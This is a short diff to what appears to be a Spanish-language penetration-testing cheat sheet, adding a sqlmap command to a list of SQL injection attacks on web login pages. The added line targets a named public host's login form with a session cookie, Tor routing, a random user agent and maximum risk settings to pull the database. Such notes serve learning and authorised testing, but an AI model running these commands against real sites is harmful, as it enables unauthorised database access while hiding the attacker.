@@ -268,6 +268,7 @@ sqlmap -u 'http://192.168.0.62/image.php?src=http://127.0.0.1:8080/checkpromo.ph
 sqlmap con proxy:
 sqlmap -u "http://127.0.0.1/wolfcms/?/admin/login/" --proxy "http://192.168.11.7:3128" --level=5 --risk=3 --dbms=mysql --current-db
 
+sqlmap -u "http://h4ckzu5.orgfree.com/login.php" --data="nick=user1¬pass=pass1&login=Entrar" --cookie="PHPSESSID=0renga3826padhmv1e845e17b1" --tor --tor-type=SOCKS5 --random-agent --level=5 --risk=3 --current-db
 
 
 -Ataques PHP
